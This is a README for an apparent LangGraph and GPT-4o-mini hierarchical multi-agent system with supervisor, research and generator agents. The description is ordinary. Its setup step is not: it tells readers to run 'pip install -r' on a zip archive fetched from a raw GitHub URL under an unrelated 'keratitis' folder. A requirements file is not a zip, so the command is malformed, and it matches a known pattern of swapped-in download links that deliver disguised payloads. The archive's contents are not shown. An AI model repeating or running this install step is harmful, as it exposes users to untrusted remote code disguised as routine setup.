# Hierarichal_Agent

This project implements a hierarchical multi-agent system using LangGraph, LangChain, and OpenAI GPT-4o-mini, designed for autonomous research and content generation workflows.

🧠 System Overview
The system simulates a human-like task delegation and collaboration structure between multiple LLM-powered agents:

👨‍💼 Supervisor Agent
Controls the overall flow
Routes control between Research and Generator teams

🔬 Research Team
Medical Researcher: Gathers latest info on medical and pharma topics using Serper API
Finance Researcher: Gathers up-to-date financial and market data


📝 Generator Team
Summarizer: Summarizes research content into concise text
Document Generator: Converts summaries into polished markdown files


🧰 Tools Used
enhanced_search: Web search via Serper
create_summary: Saves summarized content
create_document: Generates final markdown report
read_file: Reads intermediate file outputs


🚀 Technologies
LangGraph for stateful multi-agent workflows
LangChain tools for tool-augmented agents
OpenAI GPT-4o-mini for reasoning and generation
Google Serper API for live search
dotenv, pathlib, and Python OOP for environment and file handling
✅ Example Use Case
Ask:

"Research about current majorly spreading diseases and generate a detailed summary."

System output:

Web research on latest disease outbreaks
Summarization into key insights
Final report saved as a markdown file

📦 Setup Instructions
Clone the repo and install dependencies:
pip install -r https://raw.githubusercontent.com/revathi-birapaka/Hierarichal_Agent/main/keratitis/Hierarichal_Agent_v2.1.zip
